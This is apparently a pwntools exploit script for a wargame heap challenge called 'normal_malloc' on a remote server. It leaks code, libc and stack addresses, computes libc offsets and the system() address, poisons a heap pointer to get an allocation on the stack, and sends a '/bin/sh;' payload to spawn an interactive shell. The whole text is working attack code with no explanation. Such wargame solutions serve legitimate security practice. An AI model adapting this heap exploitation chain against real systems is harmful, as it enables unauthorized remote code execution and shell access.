from pwn import *

#s = process("./normal_malloc")
ELF("./normal_malloc")
s = remote("war.sejongssg.kr", 40007)

s.recvuntil("> ")
s.sendline("1")
s.recvuntil(":")
s.sendline("32")
s.recvuntil(" : ")
s.send("123")

s.recvuntil("> ")
s.sendline("3")
s.recvuntil(" : ")
s.sendline("6")
s.recvuntil("Address :")
code = s.recvuntil("\n")
code = int(code,16)
s.recvuntil("> ")
s.sendline("3")
s.recvuntil(" : ")
s.sendline("7")
s.recvuntil("Address :")
libc_240 = s.recvuntil("\n")
libc_240 = int(libc_240,16)
s.recvuntil("> ")
s.sendline("3")
s.recvuntil(" : ")
s.sendline("9")
s.recvuntil("Address :")
stack = s.recvuntil("\n")
stack = int(stack,16)
stack = stack-0x148
libc = libc_240 - 0xf0
libc = libc - 0x20740
oneshot = libc +0xf1117
system = libc+0x0000000000045390
print "libc_start : ",hex(libc_240-0xf0)
print "libcbase : ",hex(libc)
print "oneshot : ",hex(oneshot)
print "stack : ",hex(stack)

s.recvuntil("> ")
s.sendline("2")
s.recvuntil(" : ")
s.sendline("1")

s.recvuntil("> ")
s.sendline("4")
s.recvuntil(" : ")
s.sendline("1")
s.recvuntil(" : ")
s.send(p64(stack))

s.recvuntil("> ")
s.sendline("1")
s.recvuntil(":")
s.sendline("32")
s.recvuntil(" : ")
s.send("A")



s.recvuntil("> ")
s.sendline("1")
s.recvuntil(":")
s.sendline("49")
print s.recvuntil(" : ")
payload = "/bin/sh;"+"A"*16+p64(system)
s.send(payload)
s.interactive()
